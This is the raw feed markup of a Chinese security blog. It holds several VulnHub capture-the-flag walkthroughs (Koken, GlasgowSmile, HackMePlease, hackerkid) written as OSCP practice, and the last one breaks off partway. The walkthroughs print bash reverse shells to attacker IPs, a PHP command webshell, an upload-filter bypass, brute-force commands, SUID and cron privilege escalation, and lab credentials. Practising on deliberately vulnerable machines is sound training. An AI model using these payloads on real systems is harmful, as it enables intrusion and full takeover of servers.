href="mailto:&#x64;&#x61;&#105;&#115;&#x61;&#x40;&#112;&#x68;&#x6f;&#116;&#x6f;&#x67;&#114;&#x61;&#x70;&#x68;&#101;&#114;&#46;&#x63;&#x6f;&#109;">&#x64;&#x61;&#105;&#115;&#x61;&#x40;&#112;&#x68;&#x6f;&#116;&#x6f;&#x67;&#114;&#x61;&#x70;&#x68;&#101;&#114;&#46;&#x63;&#x6f;&#109;</a>，密码：babygirl</strong></p><p>用这个账密信息尝试登录koken管理员界面:<a href="http://10.0.2.100:8000/admin">http://10.0.2.100:8000/admin</a></p><p><img src="/posts/d117200a/image-20221130111757995.png" alt="登录成功"></p><h2 id="4-反弹shell"><a href="#4-反弹shell" class="headerlink" title="4.反弹shell"></a>4.反弹shell</h2><p>现在可以以管理员身份登录Koken CMS系统，搜一下这个系统的漏洞。</p><p>存在一个<a href="https://www.exploit-db.com/exploits/48706">任意文件上传漏洞</a> ，漏洞描述：Koken CMS的上传限制基于允许的文件扩展名列表(withelist)，这有助于通过Burp处理HTTP请求来进行绕过。</p><p>利用步骤：</p><p>1）创建恶意PHP文件，这里使用的是kali系统目录 &#x2F;usr&#x2F;share&#x2F;webshells&#x2F;php&#x2F;php-reverse-shell.php下的php反弹shell文件，把ip地址和端口分别修改为kali的ip和监听端口。</p><p><img src="/posts/d117200a/image-20221130140749360.png"></p><p>2）保存为 “image.php.jpg”.</p><p>3）登录Koken系统，在首页Library标签中点击“Import Content”按钮上传文件，并用burp拦截。</p><p><img src="/posts/d117200a/image-20221130141431892.png"></p><p><img src="/posts/d117200a/image-20221130141624609.png" alt="burp拦截"></p><p>4）在burp中修改文件名为“image.php”再重放。</p><p><img src="/posts/d117200a/image-20221130144449082.png" alt="标记的两处都要改"></p><p>5）在content页面，查看已经上传的php文件。</p><p><img src="/posts/d117200a/image-20221130144838277.png"></p><p>6）在kali中监听端口，触发文件链接，反弹shell成功！</p><p><img src="/posts/d117200a/image-20221130145035971.png"></p><p>查看当前权限，为www-data站点用户，进入&#x2F;home&#x2F;daisa目录，user.txt任何用户可查看，得到普通用户user.txt</p><p><img src="/posts/d117200a/image-20221130145605649.png"></p><h2 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h2><p>检查是否存在<strong>suid权限文件</strong>，suid权限的作用是允许用户以其所有者的权限执行文件，因此如果有可以让普通用户执行的属于root的文件，即可获取root权限。</p><p>用以下命令查找suid权限文件:</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">find</span> / <span class="token parameter variable">-type</span> f <span class="token parameter variable">-perm</span> <span class="token parameter variable">-u</span><span class="token operator">=</span>s <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/d117200a/image-20221130150718574.png"></p><p>发现php7.2有suid权限，查找<a href="https://gtfobins.github.io/gtfobins/php/">GTFO Bins</a>，用以下命令提权。</p><p><img src="/posts/d117200a/image-20221130151011473.png"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">/usr/bin/php7.2 <span class="token parameter variable">-r</span> <span class="token string">"pcntl_exec('/bin/bash', ['-p']);"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功获取root权限！</p><p><img src="/posts/d117200a/image-20221130151442420.png"></p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><p>靶机考察的知识点：</p><ul><li>公开的samba共享泄露账密等信息；</li><li>利用CMS系统任意文件上传漏洞反弹shell；</li><li>利用suid权限文件提权。</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>GlasgowSmile：定制字典生成爆破与提权的多种姿势</title>
      <link href="/posts/3bd3766a.html"/>
      <url>/posts/3bd3766a.html</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.vulnhub.com/entry/glasgow-smile-11,491/">靶机链接</a></p><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>扫描存在主机，靶机ip：192.168.71.134</p><p><img src="/posts/3bd3766a/image-20221117223719161.png"></p><p>扫描开放端口</p><p><img src="/posts/3bd3766a/image-20221117224430723.png"></p><p>开放端口及服务版本：</p><ul><li>22&#x2F;tcp OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</li><li>80&#x2F;tcp Apache httpd 2.4.38 ((Debian))</li></ul><p>80端口：一张图片joker.jpg。</p><p><img src="/posts/3bd3766a/image-20221117224553420.png"></p><p>开始进行目录扫描。</p><pre class="line-numbers language-none"><code class="language-none">dirb http:&#x2F;&#x2F;192.168.71.134 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫出的目录很多，重点是一名为joomla的目录。貌似是一个博客页面，google了下发现是一个内容管理系统（CMS）。</p><p>审查了源码没发现特别。</p><p><img src="/posts/3bd3766a/image-20221117230857617.png" alt="joomla"></p><p>扫描到了一个登录页面，看了下Joomla没有默认账密，所以可能需要爆破或其他途径获取账密。</p><p><img src="/posts/3bd3766a/image-20221117231507377.png" alt="administrator"></p><p>搜索Joomla系统的已知漏洞，测试poc：<a href="https://www.exploit-db.com/exploits/47465">https://www.exploit-db.com/exploits/47465</a></p><p><img src="/posts/3bd3766a/image-20221117234904447.png"></p><p>不能利用。</p><h2 id="2-cewl生成字典"><a href="#2-cewl生成字典" class="headerlink" title="2.cewl生成字典"></a>2.cewl生成字典</h2><p>尝试爆破joomla的登录界面。在joomla首页里全是小丑电影相关的台词，猜测站主可能会利用这些台词作为密码。于是利用 <a href="https://www.kali.org/tools/cewl/">cewl</a> 工具以主页内容生成密码字典。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">cewl http://192.168.71.134/joomla <span class="token parameter variable">-m</span> <span class="token number">5</span> <span class="token parameter variable">-d</span> <span class="token number">1</span> <span class="token parameter variable">-w</span> joker.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/3bd3766a/image-20221129210020094.png"></p><p>新建users.txt，作为用户名。</p><p><img src="/posts/3bd3766a/image-20221129210100551.png"></p><h2 id="3-Joomla密码爆破"><a href="#3-Joomla密码爆破" class="headerlink" title="3.Joomla密码爆破"></a>3.Joomla密码爆破</h2><p>利用nmap的NSE脚本爆破joomla。首先查找joomla相关脚本，找到了http-joomla-brute.nse。</p><p><img src="/posts/3bd3766a/image-20221129212447122.png"></p><p>修改脚本，更改脚本中的默认登录URI：</p><p><img src="/posts/3bd3766a/image-20221129212957914.png"></p><p>利用刚才生成的密码字典开始爆破：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sV</span> <span class="token parameter variable">--script</span> http-joomla-brute --script-args <span class="token string">'userdb=users.txt,passdb=joker.txt'</span> <span class="token number">192.168</span>.71.134<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/3bd3766a/image-20221129213354809.png"></p><p>爆破出了三个账号，后两个经验证是错的，可能是换行符的原因，但是joomla用户可以登录。</p><p>用<strong>账密joomla:Gotham</strong>登录joomla后台。</p><p><img src="/posts/3bd3766a/image-20221129215145303.png"></p><h2 id="4-PHP反弹shell"><a href="#4-PHP反弹shell" class="headerlink" title="4.PHP反弹shell"></a>4.PHP反弹shell</h2><p>进入系统后，编辑Beez3模板中的index.php，替换为<a href="https://pentestmonkey.net/tools/web-shells/php-reverse-shell">PHP 反弹shell</a> ，把相应的反弹地址和端口改为kali的ip地址和监听端口并保存。</p><p><img src="/posts/3bd3766a/image-20221130003031536.png" alt="进入Beez3模板页面"></p><p><img src="/posts/3bd3766a/image-20221129220840828.png" alt="修改模板的index.php"></p><p>在kali中用ncat监听4000端口，并点击预览更改后的index.php</p><p><img src="/posts/3bd3766a/image-20221129221543141.png" alt="点击标黄色的按钮触发"></p><p>shell反弹成功！</p><p><img src="/posts/3bd3766a/image-20221129221913736.png"></p><p>利用python3转为bash终端：</p><pre class="line-numbers language-none"><code class="language-none">python3 -c &quot;import pty;pty.spawn(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="5-权限提升"><a href="#5-权限提升" class="headerlink" title="5.权限提升"></a>5.权限提升</h2><p>查看当前用户权限，目前为www-data，是网络站点用户。</p><p><img src="/posts/3bd3766a/image-20221129223057288.png"></p><p>去&#x2F;home目录下看到有三个用户：</p><p><img src="/posts/3bd3766a/image-20221129223203328.png"></p><h3 id="提权至rob用户"><a href="#提权至rob用户" class="headerlink" title="提权至rob用户"></a>提权至rob用户</h3><p>进入到&#x2F;var&#x2F;www&#x2F;joomla2目录，发现一个配置文件configuration.php</p><p><img src="/posts/3bd3766a/image-20221129223558854.png"></p><p>查看配置文件，发现了数据库的用户名和密码</p><p><img src="/posts/3bd3766a/image-20221129223822633.png"></p><p>尝试用用户名joomla和密码babyjoker登录mysql数据库，登录成功！</p><p><img src="/posts/3bd3766a/image-20221129224128946.png"></p><p>经过一番查找，在数据库batjoke的taskforce表中，发现了rob用户的信息，rob为系统三个用户之一，这个密码可能就是系统rob用户的密码。</p><p><img src="/posts/3bd3766a/image-20221129224454382.png"></p><p>将pswd用base64解密</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'Pz8/QWxsSUhhdmVBcmVOZWdhdGl2ZVRob3VnaHRzPz8/'</span> <span class="token operator">|</span> base64 <span class="token parameter variable">-d</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>用户：rob 密码：???AllIHaveAreNegativeThoughts???</strong></p><p>还记得信息收集中，靶机开放了22端口，用获取的用户名密码尝试ssh连接：</p><p><img src="/posts/3bd3766a/image-20221129225218190.png"></p><p>成功以rob用户登录。</p><p>查看rob用户目录下的三个文件，分别是rob用户的user.txt，获取root权限的提示和Abner用户需要帮助。看来离获取root权限还有段距离，下一个要获取的权限是abner用户。</p><p><img src="/posts/3bd3766a/image-20221129225656149.png"></p><h3 id="提权至abner用户"><a href="#提权至abner用户" class="headerlink" title="提权至abner用户"></a>提权至abner用户</h3><p>根据Abnerineedyourhelp文件的内容分析，这一堆字像是打乱了字母顺序的英文单词。考虑为<a href="https://en.wikipedia.org/wiki/ROT13">rot13</a> 类似的加密算法，用<a href="https://gchq.github.io/CyberChef/">CyberChef</a> 进行解密。</p><p><img src="/posts/3bd3766a/image-20221129230856980.png"></p><p>对后面一串密码进行base64解码：</p><p><img src="/posts/3bd3766a/image-20221129231021696.png"></p><p><strong>用户：abner 密码：I33hope99my0death000makes44more8cents00than0my0life0</strong></p><p>利用su切换至abner用户：</p><p><img src="/posts/3bd3766a/image-20221129231627864.png"></p><p>获取到abner用户的user2.txt，然后查看info.txt文件，内容为“格拉斯哥微笑”的介绍，没有下一步提升权限的信息。</p><p><img src="/posts/3bd3766a/image-20221129231934057.png"></p><h3 id="提权至penguin用户"><a href="#提权至penguin用户" class="headerlink" title="提权至penguin用户"></a>提权至penguin用户</h3><p>已知系统有三个用户，现在就剩下penguin用户了。全盘搜索与penguin相关的文件：</p><pre class="line-numbers language-none"><code class="language-none">find &#x2F; -iname *penguin* 2&gt;&#x2F;dev&#x2F;null<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>找到了一个隐藏文件.dear_penguins.zip</p><p><img src="/posts/3bd3766a/image-20221129232408727.png"></p><p>把这个文件复制到用户目录进行解压，需要密码为abner用户的密码：I33hope99my0death000makes44more8cents00than0my0life0</p><pre class="line-numbers language-none"><code class="language-none">cp &#x2F;var&#x2F;www&#x2F;joomla2&#x2F;administrator&#x2F;manifests&#x2F;files&#x2F;.dear_penguins.zip ~ &amp;&amp; unzip .dear_penguins.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/3bd3766a/image-20221129232837056.png"></p><p>查看解压后的文件内容：</p><p><img src="/posts/3bd3766a/image-20221129233036701.png"></p><p>最后这串密码用base64解密不成功，原来这是明文&#x3D; &#x3D;</p><p><strong>用户：penguin 密码：scf4W7q4B4caTMRhSFYmktMsn87F35UkmKttM5Bz</strong></p><p>su切换用户后，获取到user3.txt</p><p><img src="/posts/3bd3766a/image-20221129233856882.png"></p><h3 id="提权至root"><a href="#提权至root" class="headerlink" title="提权至root"></a>提权至root</h3><p>通过查看penguin的文件，发现.trash_old文件很可疑，它的内容中包含&#x2F;bin&#x2F;sh，而且在root用户组中，而且可以执行。</p><p><img src="/posts/3bd3766a/image-20221129234508764.png"></p><p>利用**<a href="https://github.com/DominicBreuker/pspy">pspy</a>**对系统进程进行监控，以及对用户命令的执行进行枚举。先让靶机从kali上下载工具：</p><p>kali开启HTTP服务在8080端口</p><p><img src="/posts/3bd3766a/image-20221129235439088.png"></p><p>靶机从kali下载pspy</p><p><img src="/posts/3bd3766a/image-20221129235624907.png"></p><p>将pspy赋权限并执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> +x pspy <span class="token operator">&amp;&amp;</span> ./pspy <span class="token parameter variable">-p</span> <span class="token parameter variable">-i</span> <span class="token number">1000</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>-p：启用输出命令到标准输出（默认启用）<br>-f：启用将文件系统事件打印到STDOUT（默认禁用）<br>-i：两次扫描procfs的时间间隔（单位：毫秒）</p><p>发现.trash_old文件每间隔一分钟就以root用户身份运行一次。</p><p><img src="/posts/3bd3766a/image-20221129235938608.png"></p><p>修改.trash_old，添加以下反弹shell并注释exit 0.</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">'bash -i >&amp; /dev/tcp/192.168.71.129/4000 0>&amp;1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/3bd3766a/image-20221130000731474.png"></p><p>然后 kali主机监听4000端口，因为.trash_old每1分钟执行一次，所以等待.trash_old被执行时反弹shell回来。</p><p><img src="/posts/3bd3766a/image-20221130001104189.png"></p><p>获取到root权限成功！</p><p><img src="/posts/3bd3766a/image-20221130001225605.png"></p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><p>该靶机考察了以下知识点：</p><ul><li>cewl生成字典</li><li>利用joomla系统PHP反弹shell</li><li>密码学基础</li><li>全盘搜索敏感文件</li><li>pspy监控进程</li></ul><p>总之以Joomla内容管理系统为切入点，通过爆破进入系统后台，修改网页模板文件获取站点用户shell。接下来是步步深入考察各种提权姿势，利用数据库、密码学、文件搜索等获取各用户账密信息，最后进程监控，在以root权限执行的进程中植入反弹shell代码获取root权限。</p>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackMePlease：从开源项目中获取账密信息</title>
      <link href="/posts/3bf2f4be.html"/>
      <url>/posts/3bf2f4be.html</url>
      
        <content type="html"><![CDATA[<p>靶机下载地址：<a href="https://www.vulnhub.com/entry/hack-me-please-1,731/">https://www.vulnhub.com/entry/hack-me-please-1,731/</a></p><hr><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p><img src="/posts/3bf2f4be/image-20221117095239105.png"></p><p>开放端口信息：</p><ul><li>80&#x2F;tcp open http Apache httpd 2.4.41 ((Ubuntu))</li><li>3306&#x2F;tcp open mysql MySQL 8.0.25-0ubuntu0.20.04.1</li><li>33060&#x2F;tcp open mysqlx?</li></ul><p>测试思路：</p><ul><li>80端口：主要功能点测试、审查源码、JS文件、目录扫描</li><li>3306端口：弱口令爆破，其它途径获取可能的账密信息</li><li>33060端口：mysqlx为mysql的插件，完成文件存储数据库功能</li></ul><h3 id="访问网页"><a href="#访问网页" class="headerlink" title="访问网页"></a>访问网页</h3><p><img src="/posts/3bf2f4be/image-20221116170635838.png"></p><p>查看主要功能点，没有发现切入点。</p><h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p><img src="/posts/3bf2f4be/image-20221117090728267.png"></p><p>发现了3个目录，除了index.html外，另外两个一个是一张图片，另一个返回403禁止访问，都没有发现切入点。</p><p><img src="/posts/3bf2f4be/image-20221117091213155.png"></p><p><img src="/posts/3bf2f4be/image-20221117091420629.png"></p><h3 id="审查源码"><a href="#审查源码" class="headerlink" title="审查源码"></a>审查源码</h3><p>返回网页查看源码，其它没什么可疑之处，转而关注js文件，发现了几个感兴趣的js文件</p><p><img src="/posts/3bf2f4be/image-20221117100251759.png"></p><h3 id="JS文件"><a href="#JS文件" class="headerlink" title="JS文件"></a>JS文件</h3><p>查看main.js文件，其中暴露了一个服务目录</p><p><img src="/posts/3bf2f4be/image-20221117100540760.png"></p><p>访问该目录 <a href="http://192.168.71.149/seeddms51x/seeddms-5.1.22/%EF%BC%9A">http://192.168.71.149/seeddms51x/seeddms-5.1.22/：</a></p><p><img src="/posts/3bf2f4be/image-20221117100803453.png"></p><p>发现这是一个文档管理系统，名为SeedDMS，根据目录，版本可能为5.1.22</p><h2 id="2-SeedDMS信息收集"><a href="#2-SeedDMS信息收集" class="headerlink" title="2.SeedDMS信息收集"></a>2.SeedDMS信息收集</h2><p>访问SeedDMS首先要求登录，在面对一个登录页面时，主要有以下思路：</p><ul><li>搜索服务已公开漏洞</li><li>账密爆破</li><li>SQL注入</li><li>如果是开源项目，可以下载到本地查看可用信息，特别是配置文件。必要时需要在本地搭建该项目。</li></ul><p><strong>搜索已公开漏洞</strong>：</p><p><img src="/posts/3bf2f4be/image-20221117101836542.png"></p><p>发现其中没有针对5.1.22版本的，而且看了下，其中的两个可获取shell的RCE漏洞是由于PHP脚本文件上传导致的，是需要登录的，但是现在连登录都没成功，因此这些不可利用。</p><p><strong>账密爆破</strong>：靶机说明里提示了不需要爆破。</p><p><strong>SQL注入</strong>：注意在OSCP考试中是不可以使用sqlmap这类自动化扫描工具的。手工测试方式后续再练习。</p><p><strong>下载开源源码：</strong></p><p>SeedDMS下载地址：<a href="https://sourceforge.net/projects/seeddms/files/">https://sourceforge.net/projects/seeddms/files/</a></p><p>查看配置文件，发现了数据库连接信息，有默认账户名密码。</p><p><img src="/posts/3bf2f4be/image-20221117142937586.png"></p><p>因为把SeedDMS下载到本地，我们知道配置文件的路径为：seeddms主目录&#x2F;conf&#x2F;settings.xml</p><p>这里访问：<a href="http://192.168.71.149/seeddms51x/conf/settings.xml%EF%BC%8C">http://192.168.71.149/seeddms51x/conf/settings.xml，</a></p><p>尝试是否可以查看靶机的配置文件。</p><p><img src="/posts/3bf2f4be/image-20221117143927232.png"></p><p>可以成功读取靶机配置文件，发现数据库账户密码没改，还是seeddms：seeddms</p><h2 id="3-SeedDMS数据库"><a href="#3-SeedDMS数据库" class="headerlink" title="3.SeedDMS数据库"></a>3.SeedDMS数据库</h2><p>用账密信息连接数据库</p><pre class="line-numbers language-none"><code class="language-none">mysql  -h 192.168.71.149  -useeddms -pseeddms -Dseeddms <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/3bf2f4be/image-20221117144624804.png"></p><p>查看seeddms数据库中的表，其中tblUsers这个表中有一个admin用户，密码是被加密了的。</p><p><img src="/posts/3bf2f4be/image-20221117145415092.png"></p><p>把密码用md5解密，解密不成功。</p><p>那么换一种思路，如果把这个表更新，把admin的密码替换为我们已知密码的md5值，是否会成功呢？</p><p>把123456的md5值替换上去。</p><p><img src="/posts/3bf2f4be/image-20221117145919312.png"></p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">update tblUsers SET pwd&#x3D;&#39;e10adc3949ba59abbe56e057f20f883e&#39; where login&#x3D;&#39;admin&#39;;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>更新成功。</p><p><img src="/posts/3bf2f4be/image-20221117150417176.png"></p><p>然后尝试登录SeedDMS系统。</p><p><img src="/posts/3bf2f4be/image-20221117150604510.png"></p><p>登录成功！</p><h2 id="4-SeedDMS漏洞利用"><a href="#4-SeedDMS漏洞利用" class="headerlink" title="4.SeedDMS漏洞利用"></a>4.SeedDMS漏洞利用</h2><p>还记得之前搜索公开漏洞时，有两个RCE漏洞是PHP文件上传的，可以尝试一下在该版本中是否可以利用。</p><p><a href="https://www.exploit-db.com/exploits/47022">exploit-db上的漏洞利用</a></p><h3 id="新建后门文档"><a href="#新建后门文档" class="headerlink" title="新建后门文档"></a>新建后门文档</h3><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;pre>"</span><span class="token punctuation">;</span>        <span class="token variable">$cmd</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'cmd'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$cmd</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token keyword">die</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="上传后门并记住文档号"><a href="#上传后门并记住文档号" class="headerlink" title="上传后门并记住文档号"></a>上传后门并记住文档号</h3><p><img src="/posts/3bf2f4be/image-20221117154722357.png"></p><p>上传完成后刷新下页面，可以看到文件上传成功。</p><p><img src="/posts/3bf2f4be/image-20221117154951403.png"></p><p>系统会把上传的文件放在\seeddms51x\data\1048576\”ID“\1.php(你上传的文件会被重命名为1.php)。查看文档信息，显示文档ID为5。</p><p><img src="/posts/3bf2f4be/image-20221117155435424.png"></p><h3 id="调用后门"><a href="#调用后门" class="headerlink" title="调用后门"></a>调用后门</h3><p>访问<a href="http://192.168.71.149/seeddms51x/data/1048576/5/1.php%EF%BC%8C">http://192.168.71.149/seeddms51x/data/1048576/5/1.php，</a> 调用php后门成功。</p><p><img src="/posts/3bf2f4be/image-20221117161304085.png"></p><h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>反弹shell命令</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">bash</span> <span class="token parameter variable">-c</span> <span class="token string">'exec bash -i >&amp; /dev/tcp/192.168.71.139/4444 0>&amp;1'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将它进行URI编码后，作为cmd参数内容在hackbar里提交。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">bash%20-c%20<span class="token string">'exec%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F192.168.71.139%2F4444%200%3E%261'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/3bf2f4be/image-20221117162819807.png"></p><p>成功反弹shell</p><p><img src="/posts/3bf2f4be/image-20221117162858782.png"></p><h2 id="5-提权"><a href="#5-提权" class="headerlink" title="5.提权"></a>5.提权</h2><p>查看当前权限</p><p><img src="/posts/3bf2f4be/image-20221117164212026.png"></p><h3 id="账号收集"><a href="#账号收集" class="headerlink" title="账号收集"></a>账号收集</h3><p>查看&#x2F;etc&#x2F;passwd文件，发现一个眼熟的用户</p><p><img src="/posts/3bf2f4be/image-20221117164616331.png"></p><p>还记得查看数据表时，user表中有该名称的用户</p><p><img src="/posts/3bf2f4be/image-20221117164721295.png"></p><p>表里显示密码为：Saket@#$1337</p><h3 id="切换账号"><a href="#切换账号" class="headerlink" title="切换账号"></a>切换账号</h3><p>尝试登录saket账号</p><p><img src="/posts/3bf2f4be/image-20221117164956070.png"></p><p>登录成功！</p><h3 id="查看权限"><a href="#查看权限" class="headerlink" title="查看权限"></a>查看权限</h3><p>先用id命令，发现saket用户在很多用户组中；再用sudo -l命令查看该用户权限，发现他可以执行全部sudo命令。</p><p><img src="/posts/3bf2f4be/image-20221117165411336.png"></p><h3 id="转换为root用户"><a href="#转换为root用户" class="headerlink" title="转换为root用户"></a>转换为root用户</h3><p><img src="/posts/3bf2f4be/image-20221117165524553.png"></p><p>获取root权限成功！</p><h2 id="6-总结"><a href="#6-总结" class="headerlink" title="6.总结"></a>6.总结</h2><p>该靶机考察的点：</p><ul><li>JS敏感信息泄露：泄露了安装的应用程序目录</li><li>开源项目的信息收集：配置文件中暴露账号密码信息</li><li>mysql基础</li><li>应用服务已知漏洞收集</li><li>后门上传getshell</li><li>反弹shell命令</li><li>linux基础和提权</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hackerkid：XXE和SSTI等漏洞利用</title>
      <link href="/posts/a5e7f10c.html"/>
      <url>/posts/a5e7f10c.html</url>
      
        <content type="html"><![CDATA[<p>靶机下载地址：<a href="https://www.vulnhub.com/entry/hacker-kid-101,719/">https://www.vulnhub.com/entry/hacker-kid-101,719/</a></p><hr><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">arp-scan <span class="token parameter variable">-l</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221107105256207.png"></p><p>靶机IP地址为192.168.71.148</p><h3 id="扫描端口"><a href="#扫描端口" class="headerlink" title="扫描端口"></a>扫描端口</h3><p><img src="/posts/a5e7f10c/image-20221107105505268.png"></p><h4 id="80端口"><a href="#80端口" class="headerlink" title="80端口"></a>80端口</h4><p><img src="/posts/a5e7f10c/image-20221107105740009.png"></p><p>查看了下源码，发现提示page_no参数，先记录，后面再试。</p><p><img src="/posts/a5e7f10c/image-20221107161410887.png"></p><h4 id="9999端口"><a href="#9999端口" class="headerlink" title="9999端口"></a>9999端口</h4><p><img src="/posts/a5e7f10c/image-20221107105915002.png"></p><p>一个登录页面，查看源码有一个隐藏的输入框，名为_xsrf，值为一串数字。</p><p><img src="/posts/a5e7f10c/image-20221107110119438.png"></p><p>查了资料，发现是网页开启了<strong>XSRF保护</strong>，如果请求不带这个参数值就会被拒绝。在这儿似乎也没有什么可利用的。</p><h3 id="目录探测"><a href="#目录探测" class="headerlink" title="目录探测"></a>目录探测</h3><p><img src="/posts/a5e7f10c/image-20221107115155383.png" alt="9999的目录"></p><p><img src="/posts/a5e7f10c/image-20221107115248698.png" alt="80的目录"></p><p>深度扫描文件，用-X参数指定文件类型</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.71.148 <span class="token parameter variable">-X</span> .html,.php,.txt,.old,.bak,.tar,.zip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a5e7f10c/image-20221107162027768.png" alt="目录扫描结果"></p><p>看到了两个可用的html文件，app.html和form.html。</p><p><img src="/posts/a5e7f10c/image-20221107162645446.png" alt="app.html"></p><p><img src="/posts/a5e7f10c/image-20221107162713127.png" alt="form.html"></p><p>两个静态页面啥也没有，所谓的“兔子洞”？</p><h3 id="参数爆破"><a href="#参数爆破" class="headerlink" title="参数爆破"></a>参数爆破</h3><p>回到80端口页面源代码中的提示：试一下page_no参数Get请求，查看网页。</p><p>当page_no&#x3D;1时，页面返回一行红色的字：Oh Man !! Isn’t is right to go a little deep inside? 看来不正确，要找出正确的参数值，用burpsuite进行爆破。</p><p><img src="/posts/a5e7f10c/image-20221107163316258.png"></p><p>用burpsuite（社区版）抓包发送到Intruder模块，爆破page_no参数。</p><p><img src="/posts/a5e7f10c/image-20221107165024425.png"></p><p>设置参数值为1~50</p><p><img src="/posts/a5e7f10c/image-20221107165201487.png"></p><p>发送数据包，查看响应包长度，在参数值为21时，长度不同。</p><p><img src="/posts/a5e7f10c/image-20221107165402414.png"></p><p>该页面提示存在子域名 hackers.blackhat.local</p><p><img src="/posts/a5e7f10c/image-20221107165521411.png"></p><p>在&#x2F;etc&#x2F;hosts中添加一条解析记录</p><p><img src="/posts/a5e7f10c/image-20221107170021487.png"></p><h2 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h2><h3 id="DNS域传送漏洞"><a href="#DNS域传送漏洞" class="headerlink" title="DNS域传送漏洞"></a>DNS域传送漏洞</h3><p>页面提示表示这个黑客创建了许多子域名，思考利用这些子域名作为突破口。根据给出的域名blackhat.local，检测是否存在 <a href="https://blog.51cto.com/u_15704510/5837377">DNS域传送漏洞</a>，找出其他子域名。</p><p><img src="/posts/a5e7f10c/image-20221111091827118.png" 